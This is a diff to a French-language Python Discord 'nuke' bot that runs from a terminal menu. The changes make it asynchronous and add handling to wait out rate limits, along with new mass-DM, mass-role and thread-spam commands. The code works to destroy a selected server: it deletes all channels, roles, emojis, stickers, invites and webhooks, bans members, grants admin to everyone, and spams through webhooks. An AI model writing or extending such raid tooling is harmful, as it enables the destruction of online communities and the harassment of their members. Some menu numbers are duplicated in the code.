@@ -35,15 +35,15 @@ ASCII_ART_4 = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡄⡄⠀⠀⠀⡞⠉⠉⠉⠁⢇⠉⢀⢀⠛⢻⣿⣿⡿⠞⠃⡀⠀⠪⡀⠈⠉⠉⠌⡸⠀⠀⠀⠸⢸⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢸⣿⣿⣧⠱⠀⠀⠀⠹⣌⠐⠐⠊⠀⠠⡘⡋⣒⡁⢌⡉⠀⠀⠀⠹⢈⠀⠈⠑⠂⡂⣰⠃⠀⠀⢀⠆⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢻⣿⣿⣆⢀⠀⠀⠀⠹⢰⡀⡄⠆⠀⠾⠣⣿⢿⢢⡠⣠⡷⣓⢽⡳⠤⠰⡠⢰⡇⠁⠀⠀⠀⠎⡼⠿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠚⠷⡖⣶⣶⣴⣦⣤⣤⣤⣄⣀⣀⣛⣛⣿⣆⣡⡀⠀⠈⠸⠆⠣⠀⠀⠀⡒⠰⠦⢶⣠⣶⠶⠆⣂⣀⣀⠀⡇⣘⣃⣀⣀⣀⣊⣘⣼⡼⠎⠩⡀⢢⠢⠆⠒⠔⠒⠉⠋⠀⠈⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠙⠛⠛⠛⢛⠛⣟⣿⣿⡟⢿⣿⠿⣿⠿⢿⠿⠿⢿⠿⠿⣿⢿⣿⠿⠿⡿⠿⠿⠿⠿⢿⢿⣿⠟⣿⣿⣿⡛⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⡙⢿⡟⢻⣦⣉⠢⠘⡄⢿⣦⡀⢘⠿⢛⠮⠭⢷⡛⢟⡁⢀⣴⡟⣰⠃⠜⣡⣾⡛⢻⣿⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣷⣄⡙⢿⣿⣿⣷⣤⠀⢄⡉⠛⣃⣀⡴⠒⢛⠲⢤⣀⠘⠋⢉⡠⢁⣴⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠋⠛⠋⠂⢈⠛⠿⣿⣷⣤⣉⠻⠟⢁⢀⣠⣤⣄⣀⠉⠿⢛⣁⣤⣾⣿⣿⣿⠿⠋⠹⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠏⠀⠀⠀⠀⠀⠀⠁⠀⠬⣉⠛⠻⢿⣿⣿⣿⣿⣉⣿⣿⣿⣿⣿⣿⣿⠿⠟⠉⠁⠀⠀⠀⠀⠀⠈⠿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠨⢭⣭⣿⣿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠷⡖⣶⣶⣴⣦⣤⣤⣤⣄⣀⣀⣛⣛⣿⣆⣡⡀⠀⠈⠸⠆⠣⠀⠀⠀⡒⠰⠦⢶⣠⣶⠶⠆⣂⣀⣀⠀⡇⣘⣃⣀⣀⣀⣊⣘⣼⡼⠎⠩⡀⢢⠢⠆⠒⠔⠒⠉⠋⠀⠈⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠙⠛⠛⠛⢛⠛⣟⣿⣿⣿⡟⢿⣿⠿⣿⠿⢿⠿⠿⢿⠿⠿⣿⢿⣿⠿⠿⡿⠿⠿⠿⠿⢿⢿⣿⠟⣿⣿⣿⡛⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⡙⢿⡟⢻⣦⣉⠢⠘⡄⢿⣦⡀⢘⠿⢛⠮⠭⢷⡛⢟⡁⢀⣴⡟⣰⠃⠜⣡⣾⡛⢻⣿⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣷⣄⡙⢿⣿⣿⣷⣤⠀⢄⡉⠛⣃⣀⡴⠒⢛⠲⢤⣀⠘⠋⢉⡠⢁⣴⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠋⠛⠋⠂⢈⠛⠿⣿⣷⣤⣉⠻⠟⢁⢀⣠⣤⣄⣀⠉⠿⢛⣁⣤⣾⣿⣿⣿⠿⠋⠹⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠏⠀⠀⠀⠀⠀⠀⠁⠀⠬⣉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠉⠁⠀⠀⠀⠀⠀⠈⠿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⠨⢭⣭⣿⣿⠟⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -60,99 +60,107 @@ def clear_screen():
     else:  
         os.system('clear')
 
-def typing_effect(text, delay=0.005):
+async def typing_effect(text, delay=0.0001):
     """Affiche le texte avec un effet de frappe"""
     for char in text:
         print(Fore.RED + char, end='', flush=True)
-        time.sleep(delay)
+        await asyncio.sleep(delay)
     print()
 
-def fade_in_text(text, steps=5, delay=0.02):
+async def fade_in_text(text, steps=2, delay=0.001):
     """Effet de fade-in pour le texte"""
     for i in range(steps):
         clear_screen()
         print(Fore.RED + text)
-        time.sleep(delay)
+        await asyncio.sleep(delay)
 
-def loading_animation(text="Chargement", duration=0.5):
+async def loading_animation(text="Chargement", duration=0.05):
     """Animation de chargement"""
     chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
-    end_time = time.time() + duration
+    start_time = asyncio.get_event_loop().time()
+    end_time = start_time + duration
     i = 0
-    while time.time() < end_time:
+    while asyncio.get_event_loop().time() < end_time:
         print(f"\r{Fore.RED}{chars[i % len(chars)]} {text}...", end='', flush=True)
-        time.sleep(0.02)
+        await asyncio.sleep(0.001)
         i += 1
     print(f"\r{Fore.RED}✓ {text} terminé!   ")
-    time.sleep(0.1)
+    await asyncio.sleep(0.001)
 
-def show_ascii():
+async def wait_for_continue():
+    """Attend que l'utilisateur appuie sur Entrée sans bloquer l'event loop"""
+    await asyncio.to_thread(input, Fore.RED + "Appuyez sur Entree pour continuer...")
+
+async def show_ascii():
     """Affiche l'ASCII art 4 en rouge avec animation"""
-    for i in range(3):
+    for i in range(1):
         clear_screen()
-        time.sleep(0.1)
-    
+        await asyncio.sleep(0.001)
+
     lines = ASCII_ART_4.split('\n')
-    
+
     for line in lines:
         print(Fore.RED + line)
-        time.sleep(0.05)
-    
+        await asyncio.sleep(0.001)
+
     separator = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
     for i in range(len(separator)):
         print(f"\r{Fore.RED}{separator[:i+1]}", end='', flush=True)
-        time.sleep(0.005)
+        await asyncio.sleep(0.0001)
     print()
 
 class DiscordBot(discord.Client):
     def __init__(self, *args, **kwargs):
+        # Configuration de base sans paramètres potentiellement non supportés
         super().__init__(*args, **kwargs)
         self.selected_guild = None
+        self.reconnect_attempts = 0
+        self.max_reconnect_attempts = 10
 
     async def on_ready(self):
         clear_screen()
-        loading_animation("Connexion au bot", 0.3)
+        await loading_animation("Connexion au bot", 0.01)
         clear_screen()
-        
-        typing_effect(f'Bot connecte en tant que {self.user}!', 0.01)
-        if self.user:
-            typing_effect(f'ID: {self.user.id}', 0.01)
 
-        time.sleep(0.1)
-        show_ascii()
-        typing_effect('Le bot est maintenant en ligne!', 0.01)
-        time.sleep(0.2)
+        await typing_effect(f'Bot connecte en tant que {self.user}!', 0.0001)
+        if self.user:
+            await typing_effect(f'ID: {self.user.id}', 0.0001)
+
+        await asyncio.sleep(0.001)
+        await show_ascii()
+        await typing_effect('Le bot est maintenant en ligne!', 0.0001)
+        await asyncio.sleep(0.001)
 
         await self.select_server()
         await self.command_menu()
 
-    def show_servers(self):
+    async def show_servers(self):
         """Affiche la liste des serveurs disponibles avec animation"""
         guilds = list(self.guilds)
 
         if not guilds:
             clear_screen()
-            show_ascii()
-            typing_effect("mon reuf t sur aucun serveur", 0.05)
+            await show_ascii()
+            await typing_effect("mon reuf t sur aucun serveur", 0.05)
             return None
 
         clear_screen()
-        loading_animation("Chargement des serveurs", 0.2)
+        await loading_animation("Chargement des serveurs", 0.01)
         clear_screen()
-        show_ascii()
-        typing_effect(f"Serveurs disponibles ({len(guilds)}):", 0.01)
-        time.sleep(0.05)
+        await show_ascii()
+        await typing_effect(f"Serveurs disponibles ({len(guilds)}):", 0.0001)
+        await asyncio.sleep(0.001)
 
         for i, guild in enumerate(guilds, 1):
             member_count = guild.member_count or "?"
-            typing_effect(f"{i}. {guild.name} ({member_count} membres)", 0.005)
-            time.sleep(0.02)
+            await typing_effect(f"{i}. {guild.name} ({member_count} membres)", 0.0001)
+            await asyncio.sleep(0.001)
 
         return guilds
 
     async def select_server(self):
         """Permet de sélectionner un serveur"""
-        guilds = self.show_servers()
+        guilds = await self.show_servers()
 
         if not guilds:
             return
@@ -161,11 +169,12 @@ class DiscordBot(discord.Client):
 
         while True:
             try:
-                choice = input(Fore.RED + "Numero du serveur ('q' pour quitter, 'b' pour retourner): ").strip()
+                choice = await asyncio.to_thread(input, Fore.RED + "Numero du serveur ('q' pour quitter, 'b' pour retourner): ")
+                choice = choice.strip()
 
                 if choice.lower() == 'q':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Arret du bot...")
                     await self.close()
                     return
@@ -176,67 +185,71 @@ class DiscordBot(discord.Client):
                 if 1 <= server_num <= len(guilds):
                     self.selected_guild = guilds[server_num - 1]
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + f"Serveur selectionne: {self.selected_guild.name}")
                     break
                 else:
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + f"Choisissez un numero entre 1 et {len(guilds)}")
 
             except ValueError:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + "Entrez un numero valide ou 'q' pour quitter")
             except Exception as e:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + f"Erreur: {e}")
 
     async def command_menu(self):
         """Menu interactif des commandes dans le terminal avec animations"""
         while True:
             clear_screen()
-            show_ascii()
-            typing_effect("COMMANDES ORGANISEES PAR CATEGORIE", 0.01)
-            time.sleep(0.05)
-            
+            await show_ascii()
+            await typing_effect("COMMANDES ORGANISEES PAR CATEGORIE", 0.0001)
+            await asyncio.sleep(0.001)
+
             menu_lines = [
                 "┌─────── COLONNE 1 ─────┬─────── COLONNE 2 ─────┬─────── COLONNE 3 ─────┐",
-                "│ 1. nuke - Destruction │ 7. delemojis - Sup    │ 13. leave - Faire     │",
-                "│    totale du serveur  │    tous les emojis    │     quitter le bot    │",
+                "│ 1. nuke - Destruction │ 8. dm - Message prive │ 15. leave - Faire     │",
+                "│    totale du serveur  │    a une personne     │     quitter le bot    │",
                 "│                       │                       │                       │",
-                "│ 2. alladmin - Donner  │ 8. dm - Message prive │ 14. rename - Renommer │",
-                "│    admin a tous       │    a une personne     │     le serveur        │",
+                "│ 2. alladmin - Donner  │ 9. dmall - Message    │ 16. rename - Renommer │",
+                "│    admin a tous       │    prive a tous       │     le serveur        │",
                 "│                       │                       │                       │",
-                "│ 3. banall - Bannir    │ 9. dmall - Message    │ 15. randomban - Ban   │",
-                "│    tous les membres   │    prive a tous       │     membre aleatoire  │",
-                "│                       │                       │                       │",
-                "│ 4. kickall - Kicker   │ 10. spam - Spammer   │ 16. randomkick - Kick │",
+                "│ 3. banall - Bannir    │ 10. spam - Spammer   │ 17. randomban - Ban   │",
                 "│    tous les membres   │     dans tous salons  │     membre aleatoire  │",
                 "│                       │                       │                       │",
-                "│ 5. delchans - Sup     │ 11. create - Creer    │ 17. pub - pub tout le │",
-                "│    tous les salons    │     salons ou roles   │     serveur tkt pas   │",
-                "│                       │                       │     c cool            │",
-                "│ 6. delroles - Sup     │ 12. kickbots - Kicker │ 18. webhook - Creer   │",
-                "│    tous les roles     │     tous les bots     │     webhook et spam   │",
+                "│ 4. kickall - Kicker   │ 11. create - Creer    │ 18. randomkick - Kick │",
+                "│    tous les membres   │     salons ou roles   │     membre aleatoire  │",
+                "│                       │                       │                       │",
+                "│ 5. delchans - Sup     │ 12. kickbots - Kicker │ 19. webhook - Creer   │",
+                "│    tous les salons    │     tous les bots     │     webhook et spam   │",
+                "│                       │                       │                       │",
+                "│ 6. delroles - Sup     │ 13. massrole - Creer │ 20. massdm - Message │",
+                "│    tous les roles     │     roles en masse    │     en masse via DM   │",
+                "│                       │                       │                       │",
+                "│ 7. delemojis - Sup    │ 14. serverinfo - Info │ 21. spamthread - Creer│",
+                "│    tous les emojis    │     du serveur        │     threads de spam   │",
                 "└───────────────────────┴───────────────────────┴───────────────────────┘"
             ]
-            
+
             for line in menu_lines:
                 print(Fore.RED + line)
-                time.sleep(0.02)
-            
+                await asyncio.sleep(0.0001)
+
             print()
-            typing_effect("Touches: b = Retour | q = Quitter", 0.01)
-            time.sleep(0.05)
+            await typing_effect("Touches: b = Retour | q = Quitter", 0.0001)
+            await asyncio.sleep(0.001)
 
             try:
-                choice = input(Fore.RED + "Choisissez une commande (1-18, b ou q): ").strip().lower()
+                choice = await asyncio.to_thread(input, Fore.RED + "Choisissez une commande (1-21, b ou q): ")
+                choice = choice.strip().lower()
 
                 if choice == 'q':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Arret du bot...")
                     await self.close()
                     return
@@ -246,55 +259,55 @@ class DiscordBot(discord.Client):
                         return
                 elif choice == '1' or choice == 'nuke':
                     clear_screen()
-                    show_ascii()
-                    typing_effect("INITIALISATION DU NUKE...", 0.01)
-                    loading_animation("Preparation de la destruction", 0.3)
+                    await show_ascii()
+                    await typing_effect("INITIALISATION DU NUKE...", 0.01)
+                    await loading_animation("Preparation de la destruction", 0.3)
                     await self.delete_all_channels()
                     clear_screen()
-                    show_ascii()
-                    typing_effect(" NUKE FINISH ", 0.02)
+                    await show_ascii()
+                    await typing_effect(" NUKE FINISH ", 0.02)
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 elif choice == '2' or choice == 'alladmin':
                     clear_screen()
-                    show_ascii()
-                    typing_effect("ELEVATION DES PRIVILEGES...", 0.01)
-                    loading_animation("Attribution des permissions admin", 0.3)
+                    await show_ascii()
+                    await typing_effect("ELEVATION DES PRIVILEGES...", 0.01)
+                    await loading_animation("Attribution des permissions admin", 0.3)
                     await self.make_everyone_admin()
                     clear_screen()
-                    show_ascii()
-                    typing_effect(" TOUT LE MONDE EST MAINTENANT ADMIN! ", 0.02)
+                    await show_ascii()
+                    await typing_effect(" TOUT LE MONDE EST MAINTENANT ADMIN! ", 0.02)
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 elif choice == '3' or choice == 'banall':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "banall en cours ...")
                     await self.ban_everyone()
                     print(Fore.RED + "Tous les membres ont ete bannis!")
-                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                    await wait_for_continue()
                 elif choice == '4' or choice == 'kickall':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "kickall en cours ...")
                     await self.kick_everyone()
                     print(Fore.RED + "Tous les membres ont ete kickes!")
-                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                    await wait_for_continue()
                 elif choice == '5' or choice == 'delchans':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Suppression de tous les salons en cours...")
                     await self.delete_channels_only()
                     print(Fore.RED + "Tous les salons ont ete supprimes!")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 elif choice == '6' or choice == 'delroles':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Suppression de tous les roles en cours...")
                     await self.delete_roles_only()
                     print(Fore.RED + "Tous les roles ont ete supprimes!")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 elif choice == '7' or choice == 'delemojis':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Suppression de tous les emojis en cours...")
                     await self.delete_emojis_only()
                     print(Fore.RED + "Tous les emojis ont ete supprimes!")
@@ -309,14 +322,14 @@ class DiscordBot(discord.Client):
                     await self.create_channels()
                 elif choice == '12' or choice == 'kickbots':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     print(Fore.RED + "Kick de tous les bots en cours...")
                     await self.kick_all_bots()
                     print(Fore.RED + "Tous les bots ont ete kickes!")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
                 elif choice == '13' or choice == 'leave':
                     clear_screen()
-                    show_ascii()
+                    await show_ascii()
                     await self.leave_server()
                 elif choice == '14' or choice == 'rename':
                     await self.rename_server()
@@ -326,24 +339,45 @@ class DiscordBot(discord.Client):
                     await self.random_kick()
                 elif choice == '17' or choice == 'pub':
                     await self.pub_tiktok()
-                elif choice == '18' or choice == 'webhook':
+                elif choice == '13' or choice == 'massrole':
+                    await self.mass_role_creator()
+                elif choice == '14' or choice == 'serverinfo':
+                    await self.show_server_info()
+                elif choice == '19' or choice == 'webhook':
                     await self.webhook_spam()
+                elif choice == '20' or choice == 'massdm':
+                    await self.mass_dm_custom()
+                elif choice == '21' or choice == 'spamthread':
+                    await self.spam_threads()
                 else:
                     clear_screen()
-                    show_ascii()
-                    print(Fore.RED + "Choix invalide. Tapez 1-18, b ou q")
+                    await show_ascii()
+                    print(Fore.RED + "Choix invalide. Tapez 1-21, b ou q")
                     input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
             except Exception as e:
                 clear_screen()
-                show_ascii()
+                await show_ascii()
                 print(Fore.RED + f"Erreur: {e}")
                 input(Fore.RED + "Appuyez sur Entree pour continuer...")
 
     async def on_disconnect(self):
+        self.reconnect_attempts += 1
         clear_screen()
-        show_ascii()
-        print(Fore.RED + 'Bot deconnecte!')
+        await show_ascii()
+        print(Fore.RED + f'Bot deconnecte! (Tentative {self.reconnect_attempts}/{self.max_reconnect_attempts})')
+        print(Fore.RED + 'Tentative de reconnexion automatique...')
+        # Ne pas fermer automatiquement, laisser Discord.py gérer la reconnexion
+        # if self.reconnect_attempts >= self.max_reconnect_attempts:
+        #     print(Fore.RED + '❌ Trop de déconnexions. Vérifiez votre connexion internet et le token.')
+        #     await self.close()
+
+    async def on_resumed(self):
+        self.reconnect_attempts = 0  # Reset le compteur de reconnexions
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + 'Connexion restauree!')
+        print(Fore.RED + 'Compteur de reconnexions remis à zéro.')
 
     async def close(self):
         """Ferme proprement la connexion"""
@@ -353,70 +387,164 @@ class DiscordBot(discord.Client):
             pass
 
     async def on_connect(self):
-        print(Fore.RED + 'Connexion a Discord etablie...')
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + '✅ Connexion a Discord etablie...')
+        print(Fore.RED + 'Initialisation en cours...')
 
 
     async def delete_all_channels(self):
         """Supprime TOUT du serveur sélectionné et crée un salon final"""
         if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
             return
 
+        print(Fore.RED + "Suppression des salons...")
         channels = list(self.selected_guild.channels)
         for channel in channels:
             try:
                 await channel.delete()
-            except:
+                await asyncio.sleep(0.5)  # Délai pour éviter rate limits
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except Exception as e:
+                print(Fore.RED + f'Erreur suppression salon: {e}')
                 continue
 
+        print(Fore.RED + "Suppression des rôles...")
         roles = [role for role in self.selected_guild.roles if role.name != "@everyone"]
         for role in roles:
             try:
                 await role.delete()
-            except:
+                await asyncio.sleep(0.3)  # Délai pour éviter rate limits
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except Exception as e:
+                print(Fore.RED + f'Erreur suppression rôle: {e}')
                 continue
 
+        print(Fore.RED + "Suppression des emojis...")
         emojis = list(self.selected_guild.emojis)
         for emoji in emojis:
             try:
                 await emoji.delete()
-            except:
+                await asyncio.sleep(0.2)  # Délai pour éviter rate limits
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except Exception as e:
+                print(Fore.RED + f'Erreur suppression emoji: {e}')
                 continue
 
+        print(Fore.RED + "Suppression des stickers...")
         stickers = list(self.selected_guild.stickers)
         for sticker in stickers:
             try:
                 await sticker.delete()
-            except:
+                await asyncio.sleep(0.2)
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except Exception as e:
+                print(Fore.RED + f'Erreur suppression sticker: {e}')
                 continue
 
+        print(Fore.RED + "Suppression des invitations...")
         try:
             invites = await self.selected_guild.invites()
             for invite in invites:
                 try:
                     await invite.delete()
-                except:
+                    await asyncio.sleep(0.1)
+                except discord.HTTPException as e:
+                    if e.status == 429:
+                        retry_after = float(e.response.headers.get('Retry-After', 1))
+                        await asyncio.sleep(retry_after)
+                        continue
+                    else:
+                        print(Fore.RED + f'Erreur HTTP: {e}')
+                        continue
+                except Exception as e:
+                    print(Fore.RED + f'Erreur suppression invitation: {e}')
                     continue
-        except:
-            pass
+        except Exception as e:
+            print(Fore.RED + f'Erreur récupération invitations: {e}')
 
+        print(Fore.RED + "Suppression des webhooks...")
         try:
             webhooks = await self.selected_guild.webhooks()
             for webhook in webhooks:
                 try:
                     await webhook.delete()
-                except:
+                    await asyncio.sleep(0.1)
+                except discord.HTTPException as e:
+                    if e.status == 429:
+                        retry_after = float(e.response.headers.get('Retry-After', 1))
+                        await asyncio.sleep(retry_after)
+                        continue
+                    else:
+                        print(Fore.RED + f'Erreur HTTP: {e}')
+                        continue
+                except Exception as e:
+                    print(Fore.RED + f'Erreur suppression webhook: {e}')
                     continue
-        except:
-            pass
+        except Exception as e:
+            print(Fore.RED + f'Erreur récupération webhooks: {e}')
 
+        print(Fore.RED + "Bannissement des membres...")
         members = [member for member in self.selected_guild.members 
                   if not member.bot and member != self.selected_guild.owner and member != self.user]
         for member in members:
             try:
                 await member.ban(reason="nuke")
-            except:
+                print(Fore.RED + f'Membre banni: {member.display_name}')
+                await asyncio.sleep(1.0)  # Délai plus long pour les bans
+            except discord.HTTPException as e:
+                if e.status == 429:  # Rate limit
+                    retry_after = float(e.response.headers.get('Retry-After', 1))
+                    print(Fore.RED + f'Rate limit détecté, attente de {retry_after}s...')
+                    await asyncio.sleep(retry_after)
+                    continue
+                else:
+                    print(Fore.RED + f'Erreur HTTP: {e}')
+                    continue
+            except discord.Forbidden:
+                print(Fore.RED + f'Pas de permission pour bannir {member.display_name}')
+                continue
+            except Exception as e:
+                print(Fore.RED + f'Erreur ban {member.display_name}: {e}')
                 continue
 
